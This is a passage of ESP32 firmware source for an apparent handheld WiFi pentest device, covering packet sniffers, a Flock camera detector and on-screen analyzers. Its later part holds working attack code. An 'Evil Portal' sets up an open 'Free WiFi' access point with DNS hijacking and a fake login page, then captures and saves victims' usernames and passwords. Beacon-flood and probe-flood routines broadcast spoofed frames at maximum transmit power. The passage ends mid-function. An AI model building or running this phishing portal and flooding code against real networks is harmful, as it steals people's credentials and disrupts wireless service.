        upsertSniffEntry(sniffBuf, sniffBufCount, mac, "", rssi, ch);
        sniffListNeedsRedraw = true;
    }

    // Raw Capture: all frame types — show frame type byte + OUI vendor
    else if (currentRadioMode == WIFI_RAW_CAPTURE) {
        if (ppkt->rx_ctrl.sig_len >= 10) {
            macToStr(&payload[4], mac);  // receiver MAC at offset 4
            // Build hint: frame type + OUI prefix
            char hint[16];
            snprintf(hint, sizeof(hint), "%02X|%02X:%02X:%02X",
                payload[0], payload[4], payload[5], payload[6]);
            upsertSniffEntry(sniffBuf, sniffBufCount, mac, hint, rssi, ch);
            sniffListNeedsRedraw = true;
        }
    }

    // Scan All: every frame type — beacons, probes, data, ctrl, misc
    else if (currentRadioMode == WIFI_SCAN_ALL) {
        if (ppkt->rx_ctrl.sig_len >= 10) {
            // Use transmitter MAC (offset 10 for mgmt/data, offset 4 for ctrl)
            int macOffset = (isMgmt || isData) ? 10 : 4;
            macToStr(&payload[macOffset], mac);
            char ssidBuf[16] = "";
            if (isMgmt && !shortFrame) {
                uint8_t frameType = payload[0] & 0xFC;
                if (frameType == 0x80) {
                    // Beacon — extract SSID
                    if (ppkt->rx_ctrl.sig_len > 38 && payload[36] == 0x00) {
                        uint8_t l = payload[37]; if (l > 15) l = 15;
                        memcpy(ssidBuf, &payload[38], l); ssidBuf[l] = 0;
                    }
                } else if (frameType == 0x40) {
                    // Probe request — extract SSID
                    if (ppkt->rx_ctrl.sig_len > 26 && payload[24] == 0x00) {
                        uint8_t l = payload[25]; if (l > 15) l = 15;
                        memcpy(ssidBuf, &payload[26], l); ssidBuf[l] = 0;
                    }
                } else {
                    snprintf(ssidBuf, sizeof(ssidBuf), "F:%02X", payload[0]);
                }
            } else {
                snprintf(ssidBuf, sizeof(ssidBuf), "F:%02X", payload[0]);
            }
            upsertSniffEntry(sniffBuf, sniffBufCount, mac, ssidBuf, rssi, ch);
            sniffListNeedsRedraw = true;
        }
    }

    #undef EXTRACT_SSID

    // Flock WiFi Detection (hybrid BLE/WiFi mode)
    if (currentRadioMode == BLE_SCAN && bluetoothSnifferProfile == BT_SNIFFER_FLOCK && !shortFrame) {
        const uint8_t* addr1 = &payload[4];
        const uint8_t* addr2 = &payload[10];
        const uint8_t* addr3 = &payload[16];
        char flockSsid[21] = "";
        bool wildcardProbe = false;
        bool hasSsid = false;

        if (isMgmt) {
            hasSsid = flockExtractMgmtSsid(payload, ppkt->rx_ctrl.sig_len, frameType,
                                           flockSsid, sizeof(flockSsid), &wildcardProbe);
        }

        bool addr2Match = (isMgmt || isData) && flockOuiMatches(addr2);
        bool addr1Match = (isMgmt || isData) && !flockMacIsMulticast(addr1) && flockOuiMatches(addr1);
        bool addr3Match = isMgmt && flockOuiMatches(addr3);
        bool ssidTextMatch = false;
        bool adminConfigMatch = false;

        if (hasSsid && flockSsid[0] != 0) {
            String ssidLower = String(flockSsid);
            ssidLower.toLowerCase();
            ssidTextMatch = flockSsidLooksFlock(ssidLower);
            adminConfigMatch = flockSsidLooksAdminConfig(ssidLower);
        }

        int flockScore = flockWiFiScore(isMgmt, frameType, wildcardProbe,
                                        addr1Match, addr2Match, addr3Match,
                                        ssidTextMatch, adminConfigMatch, rssi);

        if (isMgmt && frameType == 0x40 && wildcardProbe && (addr2Match || flockScore >= 7)) {
            macToStr(addr2, mac);
            enqueueFlockWiFiAlert("Flock Probe", mac, rssi, ch,
                                  addr2Match ? "WiFi Wildcard" : "Wildcard Probe");
        } else if (addr2Match || flockScore >= 8) {
            macToStr(addr2, mac);
            const char* displayName = (flockSsid[0] != 0) ? flockSsid :
                                      (isMgmt && frameType == 0x80) ? "Flock AP" :
                                      (isMgmt && frameType == 0x40) ? "Flock Probe" :
                                      "Flock WiFi";
            const char* hint = (isMgmt && frameType == 0x80) ? (adminConfigMatch ? "Admin Beacon" : "WiFi Beacon") :
                               (isMgmt && frameType == 0x40) ? (adminConfigMatch ? "Admin Probe" : "WiFi Probe") :
                               (addr2Match ? "WiFi OUI TX" : "WiFi Camera");
            enqueueFlockWiFiAlert(displayName, mac, rssi, ch, hint);
        } else if (ssidTextMatch || (adminConfigMatch && flockScore >= 6)) {
            macToStr(addr2, mac);
            const char* hint = (isMgmt && frameType == 0x80) ? (adminConfigMatch ? "Config Beacon" : "WiFi Beacon") :
                               (isMgmt && frameType == 0x40) ? (adminConfigMatch ? "Config Probe" : "WiFi Probe") :
                               "WiFi SSID";
            enqueueFlockWiFiAlert(flockSsid, mac, rssi, ch, hint);
        }

        if (addr1Match && memcmp(addr1, addr2, 6) != 0) {
            macToStr(addr1, mac);
            enqueueFlockWiFiAlert("Flock Receiver", mac, rssi, ch, "WiFi OUI RX");
        }

        if (addr3Match && memcmp(addr3, addr2, 6) != 0 && memcmp(addr3, addr1, 6) != 0) {
            macToStr(addr3, mac);
            const char* displayName = (flockSsid[0] != 0) ? flockSsid : "Flock BSSID";
            enqueueFlockWiFiAlert(displayName, mac, rssi, ch, "WiFi OUI BSSID");
        }
    }

}

// ===== GENERIC SNIFF LIST RENDERER =====
static void drawSniffList(const char* title, const char* subtitle, SniffEntry* list, int count,
                          uint16_t accentColor) {
    if (!sniffListNeedsRedraw) return;
    sniffListNeedsRedraw = false;

    const int visibleItems = 5;
    const uint16_t bg = ILI9341_BLACK;
    const uint16_t textSoft = tft.color565(160, 160, 160);
    const uint16_t rowFill = tft.color565(18, 18, 18);
    const uint16_t rowSelected = tft.color565(34, 34, 34);

    // Only full-clear on first draw or scroll change — prevents flicker
    static int lastScrollOffset = -1;
    static const char* lastTitle = nullptr;
    bool fullRedraw = wifiScannerFirstDraw || (lastScrollOffset != sniffScrollOffset) || (lastTitle != title);
    lastScrollOffset = sniffScrollOffset;
    lastTitle = title;
    wifiScannerFirstDraw = false;

    if (fullRedraw) {
        tft.fillRect(0, 20, 240, 300, bg);
        tft.drawFastHLine(8, 68, 224, tft.color565(52, 52, 52));

        tft.setTextSize(2);
        tft.setTextColor(accentColor);
        tft.setCursor(18, 40);
        tft.print(title);

        tft.setTextSize(1);
        tft.setTextColor(textSoft);
        tft.setCursor(18, 58);
        tft.print(subtitle);

        tft.setTextColor(textSoft);
    tft.setCursor(12, 258);
    tft.print(bleScanStatus);
    tft.setCursor(12, 278);
    tft.print("UP/DN scroll  LEFT back");
}

    // count badge — always update
    tft.fillRoundRect(186, 34, 40, 16, 4, tft.color565(40, 40, 40));
    tft.setTextColor(accentColor);
    tft.setCursor(190, 38);
    tft.print(count);

    if (count == 0) {
        tft.setTextColor(textSoft);
        tft.setCursor(18, 120);
        tft.print("Listening...");
        return;
    }

    if (sniffScrollOffset > count - 1) sniffScrollOffset = 0;

    for (int i = 0; i < visibleItems; i++) {
        int idx = i + sniffScrollOffset;
        if (idx >= count) {
            // clear empty row
            tft.fillRect(8, 78 + i * 38, 224, 34, bg);
            continue;
        }

        int y = 78 + i * 38;
        bool selected = (idx == sniffSelectedIndex);

        // Draw row background and border
        tft.fillRoundRect(8, y, 224, 32, 4, selected ? rowSelected : rowFill);
        drawListSelectionFrame(8, y, 224, 32, selected, accentColor);

        // CRITICAL FIX (Bug 1.1): Clear the ENTIRE content area inside the row FIRST
        // This prevents text corruption when content changes (especially with duplicate beacons)
        tft.fillRect(14, y + 4, 210, 24, selected ? rowSelected : rowFill);

        // Now draw text - it will be clean with no corruption
        tft.setTextSize(1);
        tft.setTextColor(accentColor);
        tft.setCursor(14, y + 4);
        tft.print(list[idx].mac);

        tft.setTextColor(ILI9341_WHITE);
        tft.setCursor(14, y + 16);
        if (strlen(list[idx].ssid) > 0) {
            // BUG FIX 1.1: Ensure SSID is properly null-terminated before display
            char truncated[20];
            strncpy(truncated, list[idx].ssid, 19);
            truncated[19] = 0;
            tft.print(truncated);
        }

        tft.setTextColor(textSoft);
        tft.setCursor(170, y + 4);
        tft.print("Ch");
        tft.print(list[idx].channel);

        tft.setCursor(170, y + 16);
        tft.print(list[idx].rssi);
        tft.print("dB");
    }
}

static void handleSniffListInput(int& count) {
    if (pressedOnce(BTN_UP)) {
        if (sniffSelectedIndex > 0) sniffSelectedIndex--;
        if (sniffSelectedIndex < sniffScrollOffset) sniffScrollOffset = sniffSelectedIndex;
        sniffListNeedsRedraw = true;
    }
    if (pressedOnce(BTN_DOWN)) {
        if (sniffSelectedIndex < count - 1) sniffSelectedIndex++;
        if (sniffSelectedIndex >= sniffScrollOffset + 5) sniffScrollOffset = sniffSelectedIndex - 4;
        sniffListNeedsRedraw = true;
    }
    // Rate-limit redraws from new packets — max once per 500ms
}

static bool drawSniffWarmupIfNeeded(int count) {
    // Disabled - show results immediately without warmup screen
    wifiScanKeepStatusUntil = 0;
    return false;
}

// ===== PROBE REQUEST SNIFF =====
void runProbeSniff() {
    if (drawSniffWarmupIfNeeded(probeCount)) return;
    handleSniffListInput(probeCount);
    drawSniffList("Probe Sniff", "Probe requests", probeEntries, probeCount,
                  tft.color565(0, 220, 255));
}

// ===== BEACON SNIFF =====
void runBeaconSniff() {
    if (drawSniffWarmupIfNeeded(beaconSniffCount)) return;
    handleSniffListInput(beaconSniffCount);
    drawSniffList("Beacon Sniff", "Beacon frames", beaconSniffEntries, beaconSniffCount,
                  tft.color565(180, 100, 255));
}

// ===== DEAUTH SNIFF =====
void runDeauthSniff() {
    if (drawSniffWarmupIfNeeded(deauthCount)) return;
    handleSniffListInput(deauthCount);
    drawSniffList("Deauth Sniff", "Deauth frames", deauthEntries, deauthCount,
                  tft.color565(255, 60, 60));
}

// ===== EAPOL/PMKID SCAN =====
void runEapolScan() {
    if (drawSniffWarmupIfNeeded(eapolCount)) return;
    handleSniffListInput(eapolCount);
    drawSniffList("EAPOL/PMKID", "Handshake frames", eapolEntries, eapolCount,
                  tft.color565(255, 180, 0));
}

// ===== RAW CAPTURE =====
void runRawCapture() {
    if (drawSniffWarmupIfNeeded(rawCount)) return;
    handleSniffListInput(rawCount);
    drawSniffList("Raw Capture", "All mgmt frames", rawEntries, rawCount,
                  tft.color565(255, 255, 255));
}

// ===== STATION SNIFF =====
void runStationSniff() {
    if (drawSniffWarmupIfNeeded(stationCount)) return;
    handleSniffListInput(stationCount);
    drawSniffList("Station Sniff", "Data frame sources", stationEntries, stationCount,
                  tft.color565(255, 160, 0));
}

// ===== SIGNAL MONITOR =====
void runSignalMonitor() {
    static unsigned long lastDraw = 0;
    if (millis() - lastDraw < 120) return;
    lastDraw = millis();

    const uint16_t bg = ILI9341_BLACK;
    const uint16_t textSoft = tft.color565(160, 160, 160);
    const uint16_t accent = tft.color565(90, 220, 255);

    if (sigMonFirstDraw) {
        tft.fillRect(0, 20, 240, 300, bg);
        tft.drawFastHLine(8, 68, 224, tft.color565(52, 52, 52));
        tft.setTextSize(2);
        tft.setTextColor(ILI9341_WHITE);
        tft.setCursor(18, 40);
        tft.print("Signal Monitor");
        tft.setTextSize(1);
        tft.setTextColor(textSoft);
        tft.setCursor(18, 58);
        tft.print("Live strongest RSSI per channel");
        sigMonFirstDraw = false;
    }

    tft.fillRoundRect(14, 74, 66, 20, 4, tft.color565(22, 22, 22));
    tft.fillRoundRect(88, 74, 66, 20, 4, tft.color565(22, 22, 22));
    tft.fillRoundRect(162, 74, 62, 20, 4, tft.color565(22, 22, 22));

    tft.setTextSize(1);
    tft.setTextColor(accent);
    tft.setCursor(20, 80);
    tft.print("Hop ");
    tft.print(wifiSnifferHopChannel);

    tft.setCursor(94, 80);
    tft.print("Peak ");
    tft.print(wifiSnifferStrongestChannel);

    tft.setTextColor(ILI9341_WHITE);
    tft.setCursor(170, 80);
    tft.print(wifiSnifferStrongestRssi);
    tft.print("d");

    tft.drawRect(12, 98, 216, 118, tft.color565(44, 44, 44));
    for (int grid = 1; grid < 4; grid++) {
        int y = 98 + (grid * 29);
        tft.drawFastHLine(13, y, 214, tft.color565(28, 28, 28));
    }

    // draw 13 channel bars
    for (int ch = 1; ch <= 13; ch++) {
        int x = map(ch, 1, 13, 20, 220);
        int rssi = sigMonRssi[ch];
        int height = (rssi < -95) ? 0 : constrain(map(rssi, -95, -20, 0, 108), 0, 108);
        bool hopChannel = (ch == wifiSnifferHopChannel);
        bool strongest = (ch == wifiSnifferStrongestChannel);

        tft.fillRect(x - 7, 100, 14, 114, bg);
        if (hopChannel) {
            tft.drawFastVLine(x, 101, 112, tft.color565(40, 80, 120));
        }

        for (int y = 0; y < height; y++) {
            float ratio = (float)y / 108.0f;
            uint16_t color;
            if (ratio < 0.33f) color = tft.color565(0, 120, 255);
            else if (ratio < 0.66f) color = tft.color565(0, 220, 100);
            else color = tft.color565(255, 80, 40);
            if (strongest) {
                color = tft.color565(255, 220, 80);
            }
            tft.drawFastHLine(x - 5, 207 - y, 10, color);
        }

        tft.setTextSize(1);
        tft.setTextColor(strongest ? ILI9341_WHITE : textSoft);
        tft.setCursor(x - 3, 220);
        tft.print(ch);

        // decay
        if (sigMonRssi[ch] < -95) sigMonRssi[ch] = -95;
        else sigMonRssi[ch] -= 1;
    }

    tft.setTextColor(textSoft);
    tft.setCursor(12, 278);
    tft.print("LEFT back");
}

// ===== CHANNEL ANALYZER =====
void runChannelAnalyzer() {
    static unsigned long lastDraw = 0;
    if (millis() - lastDraw < 120) return;
    lastDraw = millis();

    const uint16_t bg = ILI9341_BLACK;
    const uint16_t textSoft = tft.color565(160, 160, 160);
    const uint16_t cyan = tft.color565(90, 220, 255);
    const uint16_t green = tft.color565(70, 220, 120);
    const uint16_t orange = tft.color565(255, 170, 60);
    const int graphX = 16;
    const int graphY = 98;
    const int graphW = 208;
    const int graphH = 118;

    if (wifiPacketFirstDraw) {
        tft.fillRect(0, 20, 240, 300, bg);
        tft.drawFastHLine(8, 68, 224, tft.color565(52, 52, 52));
        tft.setTextSize(2);
        tft.setTextColor(tft.color565(0, 200, 255));
        tft.setCursor(18, 40);
        tft.print("Channel Analyzer");
        tft.setTextSize(1);
        tft.setTextColor(textSoft);
        tft.setCursor(18, 58);
        tft.print("Smoothed traffic density");
        wifiPacketFirstDraw = false;
    }

    float peak = 0.0f;
    float sum = 0.0f;
    int peakChannel = 1;
    for (int ch = 1; ch <= 13; ch++) {
        float value = smoothedPower[ch];
        sum += value;
        if (value > peak) {
            peak = value;
            peakChannel = ch;
        }
    }
    float average = sum / 13.0f;
    float scaleMax = max(peak, 4.0f);

    tft.fillRoundRect(14, 74, 66, 20, 4, tft.color565(22, 22, 22));
    tft.fillRoundRect(88, 74, 66, 20, 4, tft.color565(22, 22, 22));
    tft.fillRoundRect(162, 74, 62, 20, 4, tft.color565(22, 22, 22));

    tft.setTextSize(1);
    tft.setTextColor(cyan);
    tft.setCursor(20, 80);
    tft.print("Live ");
    tft.print((int)smoothedPower[wifiSnifferHopChannel]);

    tft.setTextColor(green);
    tft.setCursor(94, 80);
    tft.print("Peak ");
    tft.print(peakChannel);

    tft.setTextColor(orange);
    tft.setCursor(168, 80);
    tft.print("Avg ");
    tft.print((int)average);

    tft.fillRect(graphX, graphY, graphW, graphH, bg);
    tft.drawRect(graphX, graphY, graphW, graphH, tft.color565(44, 44, 44));
    for (int grid = 1; grid < 4; grid++) {
        int y = graphY + (grid * (graphH / 4));
        tft.drawFastHLine(graphX + 1, y, graphW - 2, tft.color565(24, 24, 24));
    }

    int prevX = -1;
    int prevY = -1;
    for (int ch = 1; ch <= 13; ch++) {
        int x = map(ch, 1, 13, graphX + 8, graphX + graphW - 8);
        int y = graphY + graphH - 6 - constrain((int)map((int)smoothedPower[ch], 0, (int)scaleMax, 0, graphH - 12), 0, graphH - 12);

        tft.drawFastVLine(x, y, graphY + graphH - 5 - y, tft.color565(40, 70, 90));
        if (prevX >= 0) {
            tft.drawLine(prevX, prevY, x, y, cyan);
        }
        if (ch == peakChannel) {
            tft.fillCircle(x, y, 3, green);
        } else {
            tft.fillCircle(x, y, 2, cyan);
        }

        prevX = x;
        prevY = y;

        tft.setTextSize(1);
        tft.setTextColor(ch == peakChannel ? ILI9341_WHITE : textSoft);
        tft.setCursor(x - 3, graphY + graphH + 4);
        tft.print(ch);
    }

    int avgLineY = graphY + graphH - 6 - constrain((int)map((int)average, 0, (int)scaleMax, 0, graphH - 12), 0, graphH - 12);
    tft.drawFastHLine(graphX + 1, avgLineY, graphW - 2, orange);

    tft.setTextColor(textSoft);
    tft.setCursor(12, 278);
    tft.print("LEFT back");
}

// ===== PACKET COUNT =====
void runPacketCount() {
    static unsigned long lastDraw = 0;
    
    if (millis() - lastDraw < 200) return;
    lastDraw = millis();

    const uint16_t bg = ILI9341_BLACK;
    const uint16_t textSoft = tft.color565(160, 160, 160);

    if (pktCountFirstDraw) {
        tft.fillRect(0, 20, 240, 300, bg);
        tft.drawFastHLine(8, 68, 224, tft.color565(52, 52, 52));
        tft.setTextSize(2);
        tft.setTextColor(ILI9341_WHITE);
        tft.setCursor(18, 40);
        tft.print("Packet Count");
        tft.setTextSize(1);
        tft.setTextColor(textSoft);
        tft.setCursor(18, 58);
        tft.print("Frame type breakdown");
        pktCountFirstDraw = false;
    }

    uint32_t total = pktCountMgmt + pktCountData + pktCountCtrl;

    // Clear only the value areas, not the whole section
    auto drawRow = [&](int y, const char* label, uint32_t val, uint16_t color) {
        tft.setTextColor(color);
        tft.setTextSize(1);
        tft.setCursor(18, y);
        tft.print(label);
        
        // Clear only the number area
        tft.fillRect(130, y, 90, 16, bg);
        tft.setCursor(130, y);
        tft.setTextSize(2);
        tft.print(val);
        
        // bar
        int barW = total > 0 ? constrain((int)(val * 180 / total), 0, 180) : 0;
        tft.fillRect(18, y + 14, barW, 6, color);
        tft.fillRect(18 + barW, y + 14, 180 - barW, 6, tft.color565(30, 30, 30));
    };

    drawRow(90,  "Management", pktCountMgmt, tft.color565(0, 180, 255));
    drawRow(130, "Data",       pktCountData, tft.color565(0, 220, 100));
    drawRow(170, "Control",    pktCountCtrl, tft.color565(255, 160, 0));

    tft.setTextColor(textSoft);
    tft.setTextSize(1);
    tft.fillRect(18, 222, 200, 16, bg);
    tft.setCursor(18, 222);
    tft.print("Total: ");
    tft.setTextColor(ILI9341_WHITE);
    tft.print(total);

    tft.setTextColor(textSoft);
    tft.setCursor(12, 278);
    tft.print("LEFT back");
}

// ===== SCAN ALL =====
void runScanAll() {
    if (drawSniffWarmupIfNeeded(sniffBufCount)) return;
    handleSniffListInput(sniffBufCount);
    drawSniffList("Scan All", "Beacons + Probes", sniffBuf, sniffBufCount,
                  tft.color565(180, 255, 100));
}

// ===== ATTACK SHARED STATE =====
bool attackFirstDraw = true;
static uint8_t attackChannel = 1;
unsigned long attackLastSend = 0;
uint32_t attackPacketsSent = 0;
static uint8_t attackPacketBuffer[32]; // Shared buffer for all attacks
static uint16_t attackSeqNum = 0; // Shared sequence number for all attacks

// Removed MouseJack attack payload

static void attackNextChannel() {
    attackChannel++;
    if (attackChannel > 13) attackChannel = 1;
    esp_wifi_set_channel(attackChannel, WIFI_SECOND_CHAN_NONE);
}

static void drawAttackUI(const char* title, const char* subtitle, uint16_t color,
                         const char* stat1Label, uint32_t stat1Val,
                         const char* stat2Label, const char* stat2Val) {
    if (!attackFirstDraw) return;
    attackFirstDraw = false;
    const uint16_t bg = ILI9341_BLACK;
    const uint16_t textSoft = tft.color565(160, 160, 160);
    tft.fillRect(0, 20, 240, 300, bg);
    tft.drawFastHLine(8, 68, 224, tft.color565(52, 52, 52));
    tft.setTextSize(2); tft.setTextColor(color);
    tft.setCursor(18, 40); tft.print(title);
    tft.setTextSize(1); tft.setTextColor(textSoft);
    tft.setCursor(18, 58); tft.print(subtitle);
    tft.setTextColor(textSoft);
    tft.setCursor(12, 278); tft.print("LEFT back");
}

static void updateAttackStats(uint32_t sent, uint8_t ch, uint16_t color) {
    const uint16_t bg = ILI9341_BLACK;
    const uint16_t textSoft = tft.color565(160, 160, 160);
    tft.fillRect(12, 90, 216, 60, bg);
    tft.setTextSize(2); tft.setTextColor(color);
    tft.setCursor(18, 95); tft.print("Sent: "); tft.print(sent);
    tft.setTextSize(1); tft.setTextColor(textSoft);
    tft.setCursor(18, 120); tft.print("Ch: "); tft.print(ch);
    tft.setCursor(18, 132); tft.print("Running...");
}

// ===== EVIL PORTAL =====
static bool evilPortalInitialized = false;
static WebServer* epServer = nullptr;
static DNSServer* epDNS = nullptr;
static int epCredCount = 0;
static char epLastUser[16] = "";
static char epLastPass[16] = "";
static char epAPName[32] = "Free WiFi";
static unsigned long epSaveMessageUntil = 0;

const char EP_DEFAULT_HTML[] PROGMEM = R"(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Login</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;
background:#f0f0f0;display:flex;align-items:center;justify-content:center;height:100vh}
.box{background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:90%;max-width:320px}
h2{margin-bottom:20px;color:#333;text-align:center}input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;
border-radius:4px;font-size:14px}button{width:100%;padding:12px;background:#007bff;color:#fff;border:none;
border-radius:4px;font-size:16px;cursor:pointer;margin-top:10px}button:hover{background:#0056b3}</style></head>
<body><div class="box"><h2>WiFi Login</h2><form action="/login" method="POST">
<input type="text" name="user" placeholder="Username" required>
<input type="password" name="pass" placeholder="Password" required>
<button type="submit">Login</button></form></div></body></html>
)";

void epHandleRoot() {
    if (epServer) {
        Preferences prefs;
        prefs.begin("evilportal", true);
        String htmlPath = prefs.getString("htmlPath", "");
        prefs.end();
        
        if (htmlPath.length() > 0 && SD.exists(htmlPath)) {
            File f = SD.open(htmlPath, FILE_READ);
            if (f) {
                epServer->streamFile(f, "text/html");
                f.close();
                return;
            }
        }
        epServer->send_P(200, "text/html", EP_DEFAULT_HTML);
    }
}

void epHandleLogin() {
    if (epServer && epServer->hasArg("user") && epServer->hasArg("pass")) {
        String user = epServer->arg("user");
        String pass = epServer->arg("pass");
        
        epCredCount++;
        
        // Store last credentials (truncate to fit)
        strncpy(epLastUser, user.c_str(), 15);
        epLastUser[15] = '\0';
        strncpy(epLastPass, pass.c_str(), 15);
        epLastPass[15] = '\0';
        
        Serial.println("[EP] Captured #" + String(epCredCount));
        Serial.println("  User: " + user);
        Serial.println("  Pass: " + pass);
        
        epServer->send(200, "text/html", "<html><body><h2>Login successful</h2></body></html>");
    } else {
        epServer->send(400, "text/html", "<html><body><h2>Invalid request</h2></body></html>");
    }
}

void epStopServer() {
    if (epServer) {
        epServer->stop();
        delete epServer;
        epServer = nullptr;
    }
    if (epDNS) {
        epDNS->stop();
        delete epDNS;
        epDNS = nullptr;
    }
    WiFi.softAPdisconnect(true);
    delay(60);
    evilPortalInitialized = false;
}

void runEvilPortal() {
    if (attackFirstDraw) {
        drawAttackUI("Evil Portal", "Captive portal AP", tft.color565(255, 80, 80),
                     "Clients", 0, "Creds", "0");
        attackPacketsSent = 0;
        evilPortalInitialized = false;
        epCredCount = 0;
        epLastUser[0] = '\0';
        epLastPass[0] = '\0';
        
        // Set MAXIMUM WiFi power for maximum range
        esp_wifi_set_max_tx_power(84);  // 21 dBm = maximum
        
        // Load saved AP name from preferences
        Preferences prefs;
        prefs.begin("evilportal", true);
        String savedName = prefs.getString("apName", "Free WiFi");
        prefs.end();
        strncpy(epAPName, savedName.c_str(), 31);
        epAPName[31] = '\0';
    }
    
    if (!evilPortalInitialized) {
        epStopServer();
        shutdownWiFiStack(false);
        WiFi.persistent(false);
        WiFi.softAPdisconnect(true);
        delay(140);
        WiFi.mode(WIFI_AP);
        delay(120);
        bool apOk = WiFi.softAP(epAPName, "", attackChannel, false, 4);
        delay(180);
        
        epDNS = new DNSServer();
        if (epDNS) {
            epDNS->start(53, "*", WiFi.softAPIP());
        }
        
        epServer = new WebServer(80);
        if (epServer) {
            epServer->onNotFound(epHandleRoot);
            epServer->on("/", HTTP_GET, epHandleRoot);
            epServer->on("/hotspot-detect.html", HTTP_GET, epHandleRoot);
            epServer->on("/generate_204", HTTP_GET, epHandleRoot);
            epServer->on("/connecttest.txt", HTTP_GET, epHandleRoot);
            epServer->on("/redirect", HTTP_GET, epHandleRoot);
            epServer->on("/login", HTTP_POST, epHandleLogin);
            epServer->begin();
        }
        
        evilPortalInitialized = apOk && epServer != nullptr;
        if (!evilPortalInitialized) {
            LOG("Evil Portal AP/server start failed");
            markToolInitFailure(WIFI_ATTACK_EVIL_PORTAL, "Portal init failed", 6000UL);
        } else {
            clearToolGuardFailure(WIFI_ATTACK_EVIL_PORTAL);
        }
    }
    
    if (epDNS) epDNS->processNextRequest();
    if (epServer) epServer->handleClient();
    
    // Handle SELECT button to save credential
    if (isPressed(BTN_SELECT) && epCredCount > 0 && strlen(epLastUser) > 0 && sdMounted) {
        String filename = "/captures/wifi/ep_creds/" + String(epLastUser) + ".txt";
        
        // Create directories if they don't exist
        if (!SD.exists("/captures")) {
            SD.mkdir("/captures");
        }
        if (!SD.exists("/captures/wifi")) {
            SD.mkdir("/captures/wifi");
        }
        if (!SD.exists("/captures/wifi/ep_creds")) {
            SD.mkdir("/captures/wifi/ep_creds");
        }
        
        File f = SD.open(filename, FILE_WRITE);
        if (f) {
            f.println("Username: " + String(epLastUser));
            f.println("Password: " + String(epLastPass));
            f.println("Timestamp: " + String(millis()));
            f.close();
            
            // Set message to show for 2 seconds
            epSaveMessageUntil = millis() + 2000;
        } else {
            // Set error message to show for 2 seconds
            epSaveMessageUntil = millis() + 2000;
        }
        delay(150);
    }
    
    if (millis() - attackLastSend > 500) {
        attackLastSend = millis();
        int clients = WiFi.softAPgetStationNum();
        updateAttackStats(clients, epCredCount, tft.color565(255, 80, 80));
        
        tft.setTextSize(1);
        tft.fillRect(12, 132, 216, 100, ILI9341_BLACK);
        
        tft.setTextColor(tft.color565(160,160,160));
        tft.setCursor(18, 132);
        tft.print("Clients: "); tft.println(clients);
        tft.setCursor(18, 142);
        tft.print("Captured: "); tft.println(epCredCount);
        
        if (epCredCount > 0) {
            tft.setCursor(18, 156);
            tft.setTextColor(ILI9341_YELLOW);
            tft.println("Last credentials:");
            tft.setTextColor(ILI9341_GREEN);
            tft.setCursor(18, 166);
            tft.print("U: "); tft.println(epLastUser);
            tft.setCursor(18, 176);
            tft.print("P: "); tft.println(epLastPass);
            
            // Show save message if timer is active (check first so it takes priority)
            if (millis() < epSaveMessageUntil) {
                tft.setCursor(18, 190);
                tft.setTextColor(ILI9341_GREEN);
                tft.setTextSize(2);
                tft.print("Saved to SD!");
                tft.setTextSize(1);
            } else if (sdMounted) {
                // Show "Save" button if SD is mounted and no save message
                tft.setCursor(18, 190);
                tft.setTextColor(ILI9341_CYAN);
                tft.print("Press SELECT to save");
            }
        }
    }
}

// ===== RICK ROLL BEACON =====
static const char* const rickrollSSIDs[] PROGMEM = {
    "Never Gonna Give You Up",
    "Never Gonna Let You Down",
    "Never Gonna Run Around",
    "And Desert You",
    "Never Gonna Make You Cry",
    "Never Gonna Say Goodbye",
    "Never Gonna Tell A Lie",
    "And Hurt You"
};
static const int rickrollCount = 8;

void runRickRoll() {
    if (attackFirstDraw) {
        drawAttackUI("Rick Roll", "Beacon flood", tft.color565(255, 200, 0),
                     "Sent", 0, "", "");
        attackPacketsSent = 0;
        
        // Set MAXIMUM WiFi power for maximum range
        esp_wifi_set_max_tx_power(84);  // 21 dBm = maximum
    }
    // Send MORE frequently for better effectiveness (reduced from 150ms to 80ms)
    if (millis() - attackLastSend < 80) return;
    attackLastSend = millis();
    attackNextChannel();
    for (int n = 0; n < rickrollCount; n++) {
        const char* ssid = rickrollSSIDs[n];
        int len = strlen(ssid);
        randomMac();
        memcpy(&beaconPacket[10], macAddr, 6);
        memcpy(&beaconPacket[16], macAddr, 6);
        memset(&beaconPacket[38], ' ', 32);  // Fill with spaces
        memcpy(&beaconPacket[38], ssid, len);
        beaconPacket[37] = len;
        beaconPacket[83] = attackChannel;
        // Send 2 packets per SSID for better visibility
        for (int burst = 0; burst < 2; burst++) {
            esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, sizeof(beaconPacket), false);
            attackPacketsSent++;
            delayMicroseconds(600);  // Faster transmission
        }
    }
    updateAttackStats(attackPacketsSent, attackChannel, tft.color565(255, 200, 0));
}

// ===== PROBE FLOOD =====
static int probeFloodTargetIndex = 0;

void runProbeFlood() {
    if (attackFirstDraw) {
        drawAttackUI("Probe Flood", "Probe request spam", tft.color565(0, 200, 255),
                     "Sent", 0, "Targets", String(attackTargetCount).c_str());
        attackPacketsSent = 0;
        probeFloodTargetIndex = 0;
        attackSeqNum = 0;
        
        // Set MAXIMUM WiFi power for maximum range
        esp_wifi_set_max_tx_power(84);  // 21 dBm = maximum
    }
    
    if (attackTargetCount == 0) {
        tft.setTextSize(1);
        tft.setTextColor(ILI9341_RED);
        tft.setCursor(18, 150);
        tft.print("No targets selected!");
        return;
    }
    
    // Send MORE frequently (reduced from 150ms to 50ms)
    if (millis() - attackLastSend < 50) return;
    attackLastSend = millis();
    
    // Cycle through targets with bounds check
    if (probeFloodTargetIndex >= attackTargetCount) probeFloodTargetIndex = 0;
    if (probeFloodTargetIndex < 0) probeFloodTargetIndex = 0;
    
    attackChannel = attackTargetChannels[probeFloodTargetIndex];
    esp_wifi_set_channel(attackChannel, WIFI_SECOND_CHAN_NONE);
    
    // Build probe packet using shared buffer
    memset(attackPacketBuffer, 0, 32);
    
    attackPacketBuffer[0] = 0x40; // Probe request
    attackPacketBuffer[1] = 0x00;
    attackPacketBuffer[2] = 0x00;
    attackPacketBuffer[3] = 0x00;
    
    // Destination: broadcast
    memset(&attackPacketBuffer[4], 0xFF, 6);
    
    // Source: random MAC
    randomMac();
    memcpy(&attackPacketBuffer[10], macAddr, 6);
    
    // BSSID: broadcast
    memset(&attackPacketBuffer[16], 0xFF, 6);
    
